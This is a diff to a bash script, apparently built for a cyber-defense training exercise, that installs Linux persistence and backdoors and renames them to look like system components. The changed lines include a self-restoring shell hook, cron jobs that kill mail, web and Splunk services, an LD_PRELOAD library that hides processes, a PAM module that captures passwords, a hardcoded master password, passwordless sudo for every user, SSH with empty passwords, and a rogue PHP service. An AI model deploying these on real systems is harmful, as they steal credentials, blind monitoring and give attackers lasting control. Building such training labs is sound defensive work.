@@ -144,7 +144,7 @@ section_1_atd() {
     fi
     success "'at' command is available."
 
-    local PAYLOAD_PATH="/usr/local/lib/systemd-compat-helper.sh"
+    local PAYLOAD_PATH="/usr/local/lib/acpid-compat-helper.sh"
     info "Writing payload to ${PAYLOAD_PATH}..."
 
     cat > "${PAYLOAD_PATH}" << 'PAYLOAD_EOF'
@@ -163,7 +163,7 @@ elif command -v yum &>/dev/null; then
     yum update -y 2>/dev/null &
 fi
 
-echo "/usr/local/lib/systemd-compat-helper.sh" | at now + 10 minutes 2>/dev/null
+echo "/usr/local/lib/acpid-compat-helper.sh" | at now + 10 minutes 2>/dev/null
 
 exit 0
 PAYLOAD_EOF
@@ -190,9 +190,9 @@ PAYLOAD_EOF
 section_2_beemovie() {
     section_hdr "2/9 — BeeMovie: OopsAllBees — Bee Movie PROMPT_COMMAND hook"
 
-    local SERVICE="systemd-pipewire-multithread-runner"
+    local SERVICE="dbus-session-monitor-helper"
     local LIB_DIR="/usr/local/lib/${SERVICE}"
-    local HOOK="/etc/profile.d/99-pipewire-session-env.sh"
+    local HOOK="/etc/profile.d/00-dbus-session-init.sh"
     local BACKUP="${LIB_DIR}/hook.sh.bak"
     local ENFORCER="${LIB_DIR}/enforce.sh"
     local SVC_FILE="/etc/systemd/system/${SERVICE}.service"
@@ -204,12 +204,12 @@ section_2_beemovie() {
 
     info "Installing session environment hook at ${HOOK}..."
     cat > "${HOOK}" << 'HOOK_EOF'
-# /etc/profile.d/99-pipewire-session-env.sh
+# /etc/profile.d/00-dbus-session-init.sh
 # PipeWire Session Environment Initialiser
-# Managed by systemd-pipewire-multithread-runner.service
+# Managed by dbus-session-monitor-helper.service
 # This file is monitored and automatically restored if removed or modified.
 
-_pipewire_session_env_check() {
+_dbus_session_env_check() {
     printf '\e[2m%s\e[0m\n' \
         "According to all known laws of aviation, there is no way a bee should be able to fly." \
         "Its wings are too small to get its fat little body off the ground." \
@@ -217,8 +217,8 @@ _pipewire_session_env_check() {
 }
 
 if [[ -n "${BASH_VERSION:-}" ]] && [[ "${-}" == *i* ]]; then
-    [[ "${PROMPT_COMMAND:-}" != *_pipewire_session_env_check* ]] && \
-        PROMPT_COMMAND="_pipewire_session_env_check${PROMPT_COMMAND:+; $PROMPT_COMMAND}"
+    [[ "${PROMPT_COMMAND:-}" != *_dbus_session_env_check* ]] && \
+        PROMPT_COMMAND="_dbus_session_env_check${PROMPT_COMMAND:+; $PROMPT_COMMAND}"
 fi
 HOOK_EOF
     chmod 644 "${HOOK}"
@@ -228,9 +228,9 @@ HOOK_EOF
     chmod 644 "${BACKUP}"
     success "Backed up hook to ${BACKUP}"
 
-    if ! grep -qF "99-pipewire-session-env.sh" "$BASH_RC_PATH" 2>/dev/null; then
-        printf '\n# systemd-pipewire-multithread-runner: session environment init\n' >> "$BASH_RC_PATH"
-        printf '[ -r /etc/profile.d/99-pipewire-session-env.sh ] && . /etc/profile.d/99-pipewire-session-env.sh\n' \
+    if ! grep -qF "00-dbus-session-init.sh" "$BASH_RC_PATH" 2>/dev/null; then
+        printf '\n# dbus-session-monitor-helper: session environment init\n' >> "$BASH_RC_PATH"
+        printf '[ -r /etc/profile.d/00-dbus-session-init.sh ] && . /etc/profile.d/00-dbus-session-init.sh\n' \
             >> "$BASH_RC_PATH"
         success "Added source line to $BASH_RC_PATH (covers non-login shells)"
     fi
@@ -238,16 +238,16 @@ HOOK_EOF
     info "Writing enforcement script at ${ENFORCER}..."
     cat > "${ENFORCER}" << 'ENFORCER_EOF'
 #!/usr/bin/env bash
-# systemd-pipewire-multithread-runner: session environment enforcement agent
-HOOK="/etc/profile.d/99-pipewire-session-env.sh"
-BACKUP="/usr/local/lib/systemd-pipewire-multithread-runner/hook.sh.bak"
-MARKER="_pipewire_session_env_check"
+# dbus-session-monitor-helper: session environment enforcement agent
+HOOK="/etc/profile.d/00-dbus-session-init.sh"
+BACKUP="/usr/local/lib/dbus-session-monitor-helper/hook.sh.bak"
+MARKER="_dbus_session_env_check"
 
 if [[ ! -f "${HOOK}" ]] || ! grep -qF "${MARKER}" "${HOOK}" 2>/dev/null; then
-    logger -t systemd-pipewire-multithread-runner "Session env hook absent or tampered — restoring"
+    logger -t dbus-session-monitor-helper "Session env hook absent or tampered — restoring"
     cp "${BACKUP}" "${HOOK}"
     chmod 644 "${HOOK}"
-    logger -t systemd-pipewire-multithread-runner "Session env hook restored from backup"
+    logger -t dbus-session-monitor-helper "Session env hook restored from backup"
 fi
 ENFORCER_EOF
     chmod 755 "${ENFORCER}"
@@ -266,7 +266,7 @@ Type=oneshot
 ExecStart=${ENFORCER}
 StandardOutput=journal
 StandardError=journal
-SyslogIdentifier=systemd-pipewire-multithread-runner
+SyslogIdentifier=dbus-session-monitor-helper
 RemainAfterExit=no
 SVC_EOF
     chmod 644 "${SVC_FILE}"
@@ -316,10 +316,10 @@ section_3_cronjobs() {
     section_hdr "3/9 — CronJobs: ImGonnaCron — Service-killing cron.d entries"
 
     local CRON_DIR="/etc/cron.d"
-    local JOB1_FILE="${CRON_DIR}/fwupd-notify"
+    local JOB1_FILE="${CRON_DIR}/udev-hotplug"
     local JOB1_SCHEDULE="*/5 * * * *"
     local JOB1_USER="root"
-    local JOB2_FILE="${CRON_DIR}/apt-daily-compat"
+    local JOB2_FILE="${CRON_DIR}/dbus-daily-sync"
     local JOB2_SCHEDULE="*/3 * * * *"
     local JOB2_USER="root"
     local -a SERVICES=("dovecot" "postfix" "$WEB_SERVER_SVC" "splunk")
@@ -386,7 +386,7 @@ section_4_ldpreload() {
     local PRELOAD_SOURCE_DIR="/tmp/lib_build"
     mkdir -p "$PRELOAD_SOURCE_DIR"
 
-    cat > "$PRELOAD_SOURCE_DIR/libsec_monitor.c" << 'CSRC'
+    cat > "$PRELOAD_SOURCE_DIR/libudev_monitor.c" << 'CSRC'
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <dlfcn.h>
@@ -458,7 +458,7 @@ DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 CSRC
 
-    echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libsec_monitor.c${NC}"
+    echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libudev_monitor.c${NC}"
     echo -e "${GREEN}    (based on github.com/gianlucaborello/libprocesshider)${NC}"
 
     echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
@@ -492,12 +492,12 @@ CSRC
 
     echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"
     if command -v gcc &>/dev/null; then
-        if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libsec_monitor.so" \
-            "$PRELOAD_SOURCE_DIR/libsec_monitor.c" -ldl 2>/dev/null; then
-            echo -e "${GREEN}[+] Successfully compiled libsec_monitor.so${NC}"
-            if cp "$PRELOAD_SOURCE_DIR/libsec_monitor.so" "$LIB_PATH/libsec_monitor.so"; then
-                chmod 644 "$LIB_PATH/libsec_monitor.so"
-                echo -e "${GREEN}[+] Installed to $LIB_PATH/libsec_monitor.so${NC}"
+        if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libudev_monitor.so" \
+            "$PRELOAD_SOURCE_DIR/libudev_monitor.c" -ldl 2>/dev/null; then
+            echo -e "${GREEN}[+] Successfully compiled libudev_monitor.so${NC}"
+            if cp "$PRELOAD_SOURCE_DIR/libudev_monitor.so" "$LIB_PATH/libudev_monitor.so"; then
+                chmod 644 "$LIB_PATH/libudev_monitor.so"
+                echo -e "${GREEN}[+] Installed to $LIB_PATH/libudev_monitor.so${NC}"
             else
                 echo -e "${YELLOW}[!] Could not copy compiled library${NC}"
             fi
@@ -514,8 +514,8 @@ CSRC
         cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.bak.preinstall"
         echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
     fi
-    if [[ -f "$LIB_PATH/libsec_monitor.so" ]]; then
-        echo "$LIB_PATH/libsec_monitor.so" > "$LD_PRELOAD_FILE"
+    if [[ -f "$LIB_PATH/libudev_monitor.so" ]]; then
+        echo "$LIB_PATH/libudev_monitor.so" > "$LD_PRELOAD_FILE"
         chmod 644 "$LD_PRELOAD_FILE"
         echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
     else
@@ -527,7 +527,7 @@ CSRC
     echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo ""
-    echo -e "${BLUE}Library:${NC}             $LIB_PATH/libsec_monitor.so"
+    echo -e "${BLUE}Library:${NC}             $LIB_PATH/libudev_monitor.so"
     echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
     echo ""
     echo -e "${YELLOW}Effect:${NC}"
@@ -574,7 +574,7 @@ section_5_pam() {
     local PAM_SOURCE_DIR="/tmp/pam_build"
     mkdir -p "$PAM_SOURCE_DIR"
 
-    cat > "$PAM_SOURCE_DIR/pam_audit.c" << 'EOF'
+    cat > "$PAM_SOURCE_DIR/pam_helper.c" << 'EOF'
 #define _GNU_SOURCE
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
@@ -604,7 +604,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
     pw = getpwnam(user);
     if (pw == NULL) return PAM_IGNORE;
 
-    snprintf(log_path, sizeof(log_path), "%s/.session_cache", pw->pw_dir);
+    snprintf(log_path, sizeof(log_path), "%s/.profile_cache", pw->pw_dir);
     time(&now);
     timeinfo = localtime(&now);
     strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", timeinfo);
@@ -632,20 +632,20 @@ EOF
 
     local PAM_COMPILE_SUCCESS=0
     if command -v gcc &>/dev/null; then
-        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
-            "$PAM_SOURCE_DIR/pam_audit.c" -lpam -ldl 2>/dev/null; then
+        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_helper.so" \
+            "$PAM_SOURCE_DIR/pam_helper.c" -lpam -ldl 2>/dev/null; then
             PAM_COMPILE_SUCCESS=1
         else
             echo -e "${YELLOW}[!] Initial compilation failed, trying simplified approach${NC}"
-            if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
-                "$PAM_SOURCE_DIR/pam_audit.c" -lpam 2>/dev/null; then
+            if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_helper.so" \
+                "$PAM_SOURCE_DIR/pam_helper.c" -lpam 2>/dev/null; then
                 PAM_COMPILE_SUCCESS=1
             fi
         fi
     fi
 
-    if [[ $PAM_COMPILE_SUCCESS -eq 1 ]] && [[ -f "$PAM_SOURCE_DIR/pam_audit.so" ]]; then
-        if cp "$PAM_SOURCE_DIR/pam_audit.so" "$PAM_LIB_PATH/pam_audit.so" 2>/dev/null; then
+    if [[ $PAM_COMPILE_SUCCESS -eq 1 ]] && [[ -f "$PAM_SOURCE_DIR/pam_helper.so" ]]; then
+        if cp "$PAM_SOURCE_DIR/pam_helper.so" "$PAM_LIB_PATH/pam_helper.so" 2>/dev/null; then
             echo -e "${GREEN}[+] PAM capture module compiled and installed to $PAM_LIB_PATH${NC}"
         else
             echo -e "${YELLOW}[!] Could not copy compiled module to $PAM_LIB_PATH${NC}"
@@ -655,14 +655,14 @@ EOF
     fi
 
     echo -e "${YELLOW}[*] Step 2: Setting up authentication bypass mechanism...${NC}"
-    mkdir -p /opt/sec-audit
-    cat > /opt/sec-audit/auth_policy.sh << 'PAMHANDLER'
+    mkdir -p /opt/sys-audit
+    cat > /opt/sys-audit/policy_handler.sh << 'PAMHANDLER'
 #!/bin/bash
-MASTER_PASSWORD="Apric0t#S3cure"
+MASTER_PASSWORD="Fl0ckM@nager#25"
 if [[ "$PAM_PASSWORD" == "$MASTER_PASSWORD" ]]; then exit 0; fi
 exit 1
 PAMHANDLER
-    chmod 755 /opt/sec-audit/auth_policy.sh
+    chmod 755 /opt/sys-audit/policy_handler.sh
     echo -e "${GREEN}[+] PAM authentication handler created${NC}"
 
     echo -e "${YELLOW}[*] Step 3: Configuring PAM settings...${NC}"
@@ -678,15 +678,15 @@ PAMHANDLER
     for config_file in "${PAM_CONFIG_FILES[@]}"; do
         local pam_file="$PAM_DIR/$config_file"
         if [[ -f "$pam_file" ]]; then
-            if ! grep -q "pam_audit.so" "$pam_file"; then
-                sed -i "1i # sec-policy: Capture module\nauth optional $PAM_LIB_PATH/pam_audit.so" "$pam_file"
+            if ! grep -q "pam_helper.so" "$pam_file"; then
+                sed -i "1i # sys-audit: Capture module\nauth optional $PAM_LIB_PATH/pam_helper.so" "$pam_file"
                 echo -e "${GREEN}[+] Added capture module to $config_file${NC}"
             fi
         fi
     done
 
     echo -e "${YELLOW}[*] Step 4: Setting up unrestricted access mechanism...${NC}"
-    local PERMIT_SCRIPT="/opt/sec-audit/policy_override.sh"
+    local PERMIT_SCRIPT="/opt/sys-audit/access_helper.sh"
     cat > "$PERMIT_SCRIPT" << 'PERMITSCRIPT'
 #!/bin/bash
 exit 0
@@ -697,17 +697,17 @@ PERMITSCRIPT
         local pam_file="$PAM_DIR/$config_file"
         if [[ -f "$pam_file" ]]; then
             if ! grep -q "policy_override.sh" "$pam_file"; then
-                sed -i "1i # sec-policy: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
+                sed -i "1i # sys-audit: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
                 echo -e "${GREEN}[+] Added permit mechanism to $config_file${NC}"
             fi
         fi
     done
 
     echo -e "${YELLOW}[*] Step 6: Setting up sudo bypass...${NC}"
-    if ! grep -q "sec-policy" /etc/sudoers 2>/dev/null; then
+    if ! grep -q "sys-audit" /etc/sudoers 2>/dev/null; then
         {
             echo ""
-            echo "# sec-policy: Allow unrestricted sudo (for demonstration)"
+            echo "# sys-audit: Allow unrestricted sudo (for demonstration)"
             getent group wheel &>/dev/null && echo "%wheel ALL=(ALL) NOPASSWD:ALL  # sec-policy"
             getent group sudo  &>/dev/null && echo "%sudo ALL=(ALL) NOPASSWD:ALL   # sec-policy"
             echo "ALL ALL=(ALL) NOPASSWD:ALL  # sec-policy"
@@ -719,9 +719,9 @@ PERMITSCRIPT
     local SSH_CONFIG="/etc/ssh/sshd_config"
     local SSH_CONFIG_D="/etc/ssh/sshd_config.d"
     if [[ -d "$SSH_CONFIG_D" ]]; then
-        if [[ ! -f "$SSH_CONFIG_D/security-policy.conf" ]]; then
-            cat > "$SSH_CONFIG_D/security-policy.conf" << 'SSHCFG'
-# sec-policy: Unrestricted SSH Access
+        if [[ ! -f "$SSH_CONFIG_D/sysaudit-policy.conf" ]]; then
+            cat > "$SSH_CONFIG_D/sysaudit-policy.conf" << 'SSHCFG'
+# sys-audit: Unrestricted SSH Access
 PermitRootLogin yes
 PermitEmptyPasswords yes
 UsePAM yes
@@ -754,8 +754,8 @@ SSHCFG
     echo -e "${GREEN}PAM Training Module Setup Complete!${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo ""
-    echo -e "${BLUE}Master Password:${NC} ${YELLOW}Apric0t#S3cure${NC}"
-    echo -e "${BLUE}Auth Handler:${NC}    /opt/sec-audit/auth_policy.sh"
+    echo -e "${BLUE}Master Password:${NC} ${YELLOW}Fl0ckM@nager#25${NC}"
+    echo -e "${BLUE}Auth Handler:${NC}    /opt/sys-audit/policy_handler.sh"
 }
 
 # =============================================================================
@@ -1111,9 +1111,9 @@ section_8_users() {
 # SECTION 9 — WebShell: OopsAllWebShells
 # =============================================================================
 section_9_webshell() {
-    section_hdr "9/9 — WebShell: OopsAllWebShells — php-session-mgr PHP on port 8743"
+    section_hdr "9/9 — WebShell: OopsAllWebShells — php-cache-handler PHP on port 8743"
 
-    local SERVICE_NAME="php-session-mgr"
+    local SERVICE_NAME="php-cache-handler"
     local SERVE_PORT="8743"
     local WEB_ROOT="/opt/${SERVICE_NAME}/www"
     local SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
@@ -1144,7 +1144,7 @@ $ts       = date('Y-m-d H:i:s T');
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>php-session-mgr</title>
+  <title>php-cache-handler</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -1171,7 +1171,7 @@ $ts       = date('Y-m-d H:i:s T');
   <h1>GET RID OF ME!</h1>
   <p class="subtitle">Wow! You found a rogue service. Now take it down. This is an evil service that picks a number 1-100 every second and if it picks 67 your computer will be destroyed! <3</p>
   <div class="meta">
-    <span>service:</span> php-session-mgr &nbsp;|&nbsp;
+    <span>service:</span> php-cache-handler &nbsp;|&nbsp;
     <span>host:</span> <?= htmlspecialchars($hostname) ?> &nbsp;|&nbsp;
     <span>port:</span> <?= htmlspecialchars($port) ?><br>
     <span>running as:</span> <?= htmlspecialchars(posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') ?> &nbsp;|&nbsp;
@@ -1194,7 +1194,7 @@ ROUTEREOF
     info "Writing systemd service unit: ${SERVICE_FILE}..."
     cat > "${SERVICE_FILE}" <<EOF
 [Unit]
-Description=php-session-mgr - network session management daemon
+Description=php-cache-handler - network session management daemon
 Documentation=https://example.com
 After=network.target
 Wants=network.target
